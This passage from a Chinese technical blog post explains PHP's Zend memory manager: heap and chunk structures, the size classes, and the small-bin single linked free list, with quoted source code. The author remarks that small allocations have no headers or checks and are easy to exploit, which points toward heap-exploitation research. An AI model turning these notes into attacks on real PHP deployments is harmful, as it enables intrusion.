class="title">zend_mm_block</span> &#123;</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">&#125; zend_mm_block;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_small_free_block</span> &#123;</span>  <span class="comment">/* 双向链表 */</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">prev_free_block</span>;</span>    <span class="comment">/* 前一个块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">next_free_block</span>;</span>    <span class="comment">/* 后一个块 */</span></span><br><span class="line">&#125; zend_mm_small_free_block; <span class="comment">/* 小的空闲块*/</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> &#123;</span>    <span class="comment">/* 双向链表 + 树结构 */</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">prev_free_block</span>;</span>    <span class="comment">/* 前一个块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">next_free_block</span>;</span>    <span class="comment">/* 后一个块 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> **<span class="title">parent</span>;</span>    <span class="comment">/* 父结点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">child</span>[2];</span>   <span class="comment">/* 两个子结点*/</span></span><br><span class="line">&#125; zend_mm_free_block;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>                 use_zend_alloc; <span class="comment">/* 是否使用zend内存管理器 */</span></span><br><span class="line">    <span class="type">void</span>               *(*_malloc)(<span class="type">size_t</span>); <span class="comment">/* 内存分配函数*/</span></span><br><span class="line">    <span class="type">void</span>                (*_free)(<span class="type">void</span>*);    <span class="comment">/* 内存释放函数*/</span></span><br><span class="line">    <span class="type">void</span>               *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span>              free_bitmap;    <span class="comment">/* 小块空闲内存标识 */</span></span><br><span class="line">    <span class="type">size_t</span>              large_free_bitmap;  <span class="comment">/* 大块空闲内存标识*/</span></span><br><span class="line">    <span class="type">size_t</span>              block_size;     <span class="comment">/* 一次内存分配的段大小，即ZEND_MM_SEG_SIZE指定的大小，默认为ZEND_MM_SEG_SIZE   (256 * 1024)*/</span></span><br><span class="line">    <span class="type">size_t</span>              compact_size;   <span class="comment">/* 压缩操作边界值，为ZEND_MM_COMPACT指定大小，默认为 2 * 1024 * 1024*/</span></span><br><span class="line">    zend_mm_segment    *segments_list;  <span class="comment">/* 段指针列表 */</span></span><br><span class="line">    zend_mm_storage    *storage;    <span class="comment">/* 所调用的存储层 */</span></span><br><span class="line">    <span class="type">size_t</span>              real_size;  <span class="comment">/* 堆的真实大小 */</span></span><br><span class="line">    <span class="type">size_t</span>              real_peak;  <span class="comment">/* 堆真实大小的峰值 */</span></span><br><span class="line">    <span class="type">size_t</span>              limit;  <span class="comment">/* 堆的内存边界 */</span></span><br><span class="line">    <span class="type">size_t</span>              size;   <span class="comment">/* 堆大小 */</span></span><br><span class="line">    <span class="type">size_t</span>              peak;   <span class="comment">/* 堆大小的峰值*/</span></span><br><span class="line">    <span class="type">size_t</span>              reserve_size;   <span class="comment">/* 备用堆大小*/</span></span><br><span class="line">    <span class="type">void</span>               *reserve;    <span class="comment">/* 备用堆 */</span></span><br><span class="line">    <span class="type">int</span>                 overflow;   <span class="comment">/* 内存溢出数*/</span></span><br><span class="line">    <span class="type">int</span>                 internal;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CACHE</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        cached; <span class="comment">/* 已缓存大小 */</span></span><br><span class="line">    zend_mm_free_block *cache[ZEND_MM_NUM_BUCKETS]; <span class="comment">/* 缓存数组/</span></span><br><span class="line"><span class="comment">#endif</span></span><br><span class="line"><span class="comment">    zend_mm_free_block *free_buckets[ZEND_MM_NUM_BUCKETS*2];    /* 小块内存数组，相当索引的角色 */</span></span><br><span class="line">    zend_mm_free_block *large_free_buckets[ZEND_MM_NUM_BUCKETS];    <span class="comment">/* 大块内存数组，相当索引的角色 */</span></span><br><span class="line">    zend_mm_free_block *rest_buckets[<span class="number">2</span>];    <span class="comment">/* 剩余内存数组*/</span></span><br><span class="line"> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>PHP中的内存管理主要工作就是维护三个列表：<strong>小块内存列表（free_buckets）、大块内存列表（large_free_buckets）和剩余内存列表（rest_buckets）。</strong></p>
<p>在内存管理初始化时，PHP内核对初始化free_buckets列表。从heap的定义我们可知free_buckets是一个数组指针，其存储的本质是指向zend_mm_free_block结构体的指针。开始时这些指针都没有指向具体的元素，只是一个简单的指针空间。free_buckets列表在实际使用过程中只存储指针，这些指针以两个为一对（即数组从0开始，两个为一对,就像ptmalloc2的bins），分别存储一个个双向链表的头尾指针。其结构如图:</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_160932.png" alt=""></p>
<p>free_buckets列表的作用是存储小块内存，而与之对应的large_free_buckets列表的作用是存储大块的内存，虽然large_free_buckets列表也类似于一个hash表，但是这个与前面的free_buckets列表一些区别。它是一个集成了数组，树型结构和双向链表三种数据结构的混合体。我们先看其数组结构，数组是一个hash映射，其hash函数为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> ZEND_MM_LARGE_BUCKET_INDEX(S) zend_mm_high_bit(S)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">zend_mm_high_bit</span><span class="params">(<span class="type">size_t</span> _size)</span></span><br><span class="line">&#123;</span><br><span class="line"> </span><br><span class="line">..<span class="comment">//省略若干不同环境的实现</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (_size != <span class="number">0</span>) &#123;</span><br><span class="line">        _size = _size &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        n++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个hash函数用来计算size中最高位的1的比特位是多少，这点从其函数名就可以看出。假设此时size为512Byte，则这段内存会放在large_free_buckets列表，512的二进制码为1000000000，则zend_mm_high_bit(512)计算的值为9，则其对应的列表index为9。关于右移操作，这里有一点说明</p>
<p>large_free_buckets列表的结构如图所示：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_162042.png" alt=""></p>
<h4 id="新"><a href="#新" class="headerlink" title="新"></a>新</h4><p>新版才是现在的主流,我们主要关注这个</p>
<p>新zend内存分配有三种模式</p>
<ul>
<li>small:&lt;=3KB的内存</li>
<li>large:3KB小于等于(2MB减去4KB)内存</li>
<li>huge:大于2MB减去4KB内存</li>
</ul>
<p>内存数据结构:<br>全局变量alloc_globals.mm_heap指向zend_mm_heap数据结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line">	<span class="type">int</span>                use_custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STORAGE</span></span><br><span class="line">	zend_mm_storage   *storage;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="type">size_t</span>             size;                    <span class="comment">/* current memory usage */</span></span><br><span class="line">	<span class="type">size_t</span>             peak;                    <span class="comment">/* peak memory usage */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	zend_mm_free_slot *free_slot[ZEND_MM_BINS]; <span class="comment">/* free lists for small sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT || ZEND_MM_LIMIT</span></span><br><span class="line">	<span class="type">size_t</span>             real_size;               <span class="comment">/* current size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="type">size_t</span>             real_peak;               <span class="comment">/* peak size of allocated pages */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_LIMIT</span></span><br><span class="line">	<span class="type">size_t</span>             limit;                   <span class="comment">/* memory limit */</span></span><br><span class="line">	<span class="type">int</span>                overflow;                <span class="comment">/* memory overflow flag */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	zend_mm_huge_list *huge_list;               <span class="comment">/* list of huge allocated blocks */</span></span><br><span class="line"></span><br><span class="line">	zend_mm_chunk     *main_chunk;</span><br><span class="line">	zend_mm_chunk     *cached_chunks;			<span class="comment">/* list of unused chunks */</span></span><br><span class="line">	<span class="type">int</span>                chunks_count;			<span class="comment">/* number of alocated chunks */</span></span><br><span class="line">	<span class="type">int</span>                peak_chunks_count;		<span class="comment">/* peak number of allocated chunks for current request */</span></span><br><span class="line">	<span class="type">int</span>                cached_chunks_count;		<span class="comment">/* number of cached chunks */</span></span><br><span class="line">	<span class="type">double</span>             avg_chunks_count;		<span class="comment">/* average number of chunks allocated per request */</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_CUSTOM</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span>);</span><br><span class="line">			<span class="type">void</span>       (*_free)(<span class="type">void</span>*);</span><br><span class="line">			<span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">		&#125; <span class="built_in">std</span>;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			<span class="type">void</span>      *(*_malloc)(<span class="type">size_t</span> ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">			<span class="type">void</span>       (*_free)(<span class="type">void</span>*  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">			<span class="type">void</span>      *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>  ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC);</span><br><span class="line">		&#125; debug;</span><br><span class="line">	&#125; custom_heap;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>chunk数据结构:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_chunk</span> &#123;</span></span><br><span class="line">	zend_mm_heap      *heap;<span class="comment">//AG()里的mm_heap地址</span></span><br><span class="line">	zend_mm_chunk     *next;<span class="comment">//下一个trunk</span></span><br><span class="line">	zend_mm_chunk     *prev;<span class="comment">//之前的trunk</span></span><br><span class="line">	<span class="type">int</span>                free_pages;				<span class="comment">/* number of free pages */</span></span><br><span class="line">	<span class="type">int</span>                free_tail;               <span class="comment">/* number of free pages at the end of chunk </span></span><br><span class="line"><span class="comment">    最后一块连续可用的page*/</span></span><br><span class="line">	<span class="type">int</span>                num; <span class="comment">//当前chunk的序号</span></span><br><span class="line">	<span class="type">char</span>               reserve[<span class="number">64</span> - (<span class="keyword">sizeof</span>(<span class="type">void</span>*) * <span class="number">3</span> + <span class="keyword">sizeof</span>(<span class="type">int</span>) * <span class="number">3</span>)];</span><br><span class="line">	zend_mm_heap       heap_slot;               <span class="comment">/* 只用于mainchunk used only in main chunk */</span></span><br><span class="line">	zend_mm_page_map   free_map;                <span class="comment">/* 空闲页的位图512 bits or 64 bytes */</span></span><br><span class="line">	zend_mm_page_info  <span class="built_in">map</span>[ZEND_MM_PAGES];      <span class="comment">/* 存储每个页的使用信息,高两位代表使用内存的类型,低十位区分是否连续的页 2 KB = 512 * 4 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一个chunk管理512个页,也就是2m(4096*512)的内存,一个chunk中的页可以用于满足多种大小的分配</p>
<p><strong>内存分配逻辑</strong></p>
<p><strong>huge</strong></p>
<p><strong>分配</strong><br>1.申请size需要根据page_size进行对齐<br>2.对齐后的size再根据chunk_size大小进行对齐<br>3.将内存挂载到alloc_global.mm_heap-&gt;huge_list上</p>
<p><strong>释放:</strong> 从huge_list链表中删除,调用munmap释放.</p>
<p><strong>large</strong></p>
<p>large分配是page分配的整数倍.</p>
<p>1.遍历双向链表alloc_global.mm_heap-&gt;main_trunk<br>2.如果free_pages小于要申请的页的个数回到1.<br>3.根据zend_mm_chunk-&gt;free_map查找最优连续page(连续page个数最少,连续page编号最少).<br>4.如果查找可分配的页则返回对应的地址,并将map[page_num]标记为large内存<br>5.如果chunk都没有可分配内存,就新申请一个chunk,在进行分配.</p>
<p><strong>释放:</strong><br>将zend_mm_chunk-&gt;free_map[page_num],zend_mm_chunk-&gt;map[page_num]置为0.<br>然后修改free_pages.如果pages都释放,那么释放chunk.</p>
<h3 id="small分配路径"><a href="#small分配路径" class="headerlink" title="small分配路径"></a>small分配路径</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/41622782">【PHP7源码分析】PHP内存管理（上） - 知乎 (zhihu.com)</a>,这篇文章很不错</p>
<p><strong>small</strong>分配在php内存利用中是比较轻易的,因为其并没有足够的检查</p>
<p>small类型共分为<strong>30种不同的大小</strong>.规格如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//宏定义：第一列表示序号（称之为bin_num），第二列表示每个small内存的大小（字节数）；//第四列表示每次获取多少个page；第三列表示将page分割为多少个大小为第一列的small内存；#define ZEND_MM_BINS_INFO(_, x, y) \</span></span><br><span class="line"><span class="comment">    _( 0,    8,  512, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 1,   16,  256, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 2,   24,  170, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 3,   32,  128, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 4,   40,  102, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 5,   48,   85, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 6,   56,   73, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 7,   64,   64, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 8,   80,   51, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _( 9,   96,   42, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(10,  112,   36, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(11,  128,   32, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(12,  160,   25, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(13,  192,   21, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(14,  224,   18, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(15,  256,   16, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(16,  320,   64, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(17,  384,   32, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(18,  448,    9, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(19,  512,    8, 1, x, y) \</span></span><br><span class="line"><span class="comment">    _(20,  640,   32, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(21,  768,   16, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(22,  896,    9, 2, x, y) \</span></span><br><span class="line"><span class="comment">    _(23, 1024,    8, 2, x, y) \</span></span><br><span class="line"><span class="comment">    _(24, 1280,   16, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(25, 1536,    8, 3, x, y) \</span></span><br><span class="line"><span class="comment">    _(26, 1792,   16, 7, x, y) \</span></span><br><span class="line"><span class="comment">    _(27, 2048,    8, 4, x, y) \</span></span><br><span class="line"><span class="comment">    _(28, 2560,    8, 5, x, y) \</span></span><br><span class="line"><span class="comment">    _(29, 3072,    4, 3, x, y)</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* ZEND_ALLOC_SIZES_H */</span></span></span><br></pre></td></tr></table></figure>
<p>zendmm中chunk的含义和ptmalloc2中不太相同,我这里将<u>管理同一大小</u>的一个或多个页称为small_frame</p>
<p><u>一个small_frame上所有空闲的块全都被链在一个单链表上</u>,采用<u>lifo</u>的方式管理,链表头由mm_heap-&gt;free_slot数组维护</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_never_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small_slow</span><span class="params">(zend_mm_heap *heap, <span class="type">uint32_t</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		omitted...</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">    </span><br><span class="line">	chunk = (zend_mm_chunk*)ZEND_MM_ALIGNED_BASE(bin, ZEND_MM_CHUNK_SIZE);</span><br><span class="line">	page_num = ZEND_MM_ALIGNED_OFFSET(bin, ZEND_MM_CHUNK_SIZE) / ZEND_MM_PAGE_SIZE;</span><br><span class="line">	chunk-&gt;<span class="built_in">map</span>[page_num] = ZEND_MM_SRUN(bin_num);</span><br><span class="line">	<span class="keyword">if</span> (bin_pages[bin_num] &gt; <span class="number">1</span>) &#123;</span><br><span class="line">		<span class="type">uint32_t</span> i = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			chunk-&gt;<span class="built_in">map</span>[page_num+i] = ZEND_MM_NRUN(bin_num, i);</span><br><span class="line">			i++;</span><br><span class="line">		&#125; <span class="keyword">while</span> (i &lt; bin_pages[bin_num]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* create a linked list of elements from 1 to last */</span></span><br><span class="line">	end = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + (bin_data_size[bin_num] * (bin_elements[bin_num] - <span class="number">1</span>)));</span><br><span class="line">	heap-&gt;free_slot[bin_num] = p = (zend_mm_free_slot*)((<span class="type">char</span>*)bin + bin_data_size[bin_num]);</span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		p-&gt;next_free_slot = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)p + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">			dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">		&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">		p = (zend_mm_free_slot*)((<span class="type">char</span>*)p + bin_data_size[bin_num]);</span><br><span class="line">	&#125; <span class="keyword">while</span> (p != end);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">		omitted...</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数主要用于分配small_frame时构建small链。它解释了 30 条单链是如何构建的。</p>
<p>因为链的每个部分不必包含有关其大小的标头，只留下 next字段,组织形式有点像glibc的fastbin或tcachebin,甚至更危险因为其甚至没有块头,这显然是极其危险的</p>
<p>与ptmalloc2不同,其没有一个top_chunk管理所有尚未使用区域,而是像slab分配器那样,所有空闲的块全部组织在链上,但不同的是,zendmm没有slab那么多的保护机制</p>
<p><strong>alloc</strong>时</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> *<span class="title function_">zend_mm_alloc_small</span><span class="params">(zend_mm_heap *heap, <span class="type">int</span> bin_num ZEND_FILE_LINE_DC ZEND_FILE_LINE_ORIG_DC)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		<span class="type">size_t</span> size = heap-&gt;size + bin_data_size[bin_num];</span><br><span class="line">		<span class="type">size_t</span> peak = MAX(heap-&gt;peak, size);</span><br><span class="line">		heap-&gt;size = size;</span><br><span class="line">		heap-&gt;peak = peak;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (EXPECTED(heap-&gt;free_slot[bin_num] != <span class="literal">NULL</span>)) &#123;</span><br><span class="line">		zend_mm_free_slot *p = heap-&gt;free_slot[bin_num];</span><br><span class="line">		heap-&gt;free_slot[bin_num] = p-&gt;next_free_slot;</span><br><span class="line">		<span class="keyword">return</span> p;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> zend_mm_alloc_small_slow(heap, bin_num ZEND_FILE_LINE_RELAY_CC ZEND_FILE_LINE_ORIG_RELAY_CC);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>根据申请的内存查找对应的规格表</p>
</li>
<li><p>根据规格表中的num,如果mm_heap-&gt;free_slot[num]为空则继续下一步,如果不为空返回对应的地址,并从mm_heap-&gt;free_slot[num]指向链表的首地址删除</p>
</li>
<li><p>申请的规格表中对应的页数(bin_pages[bin_num])并更新mm_chunk-&gt;map[page_num]<u>标识位为small内存</u>.</p>
<p>第一个页需要设置mappage_num(位于map的24bit-16bit位段)设置free_slot个数.接下的连续页的标志位给予顺序标志(位于map的24bit-16bit位段).</p>
</li>
</ol>
<p><strong>释放时:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> zend_always_inline <span class="type">void</span> <span class="title function_">zend_mm_free_small</span><span class="params">(zend_mm_heap *heap, <span class="type">void</span> *ptr, <span class="type">int</span> bin_num)</span></span><br><span class="line">&#123;</span><br><span class="line">	zend_mm_free_slot *p;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_MM_STAT</span></span><br><span class="line">	heap-&gt;size -= bin_data_size[bin_num];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> ZEND_DEBUG</span></span><br><span class="line">	<span class="keyword">do</span> &#123;</span><br><span class="line">		zend_mm_debug_info *dbg = (zend_mm_debug_info*)((<span class="type">char</span>*)ptr + bin_data_size[bin_num] - ZEND_MM_ALIGNED_SIZE(<span class="keyword">sizeof</span>(zend_mm_debug_info)));</span><br><span class="line">		dbg-&gt;size = <span class="number">0</span>;</span><br><span class="line">	&#125; <span class="keyword">while</span> (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	p = (zend_mm_free_slot*)ptr;</span><br><span class="line">	p-&gt;next_free_slot = heap-&gt;free_slot[bin_num];</span><br><span class="line">	heap-&gt;free_slot[bin_num] = p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接插入mm_heap-&gt;free_slot当中.</p>
<h2 id="常用接口函数"><a href="#常用接口函数" class="headerlink" title="常用接口函数"></a>常用接口函数</h2><h3 id="zend-parse-paramenters"><a href="#zend-parse-paramenters" class="headerlink" title="zend_parse_paramenters"></a>zend_parse_paramenters</h3><p>函数原型</p>
<p><code>int zend_parse_parameters(int num_args, const char *type_spec, ...);</code></p>
<p><code>zend_parse_parameters</code> 解析参数，第一个参数是传递的参数个数。通常使用 <code>ZEND_NUM_ARGS()</code> 来获取。 </p>
<p>第二个参数是一个字符串，指定了函数期望的各个参数的类型，后面紧跟着需要随参数值更新的变量列表。 因为PHP采用松散的变量定义和动态的类型判断，这样做就使得把不同类型的参数转化为期望的类型成为可能。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>参数</th>
<th>代表着的类型</th>
</tr>
</thead>
<tbody>
<tr>
<td>b</td>
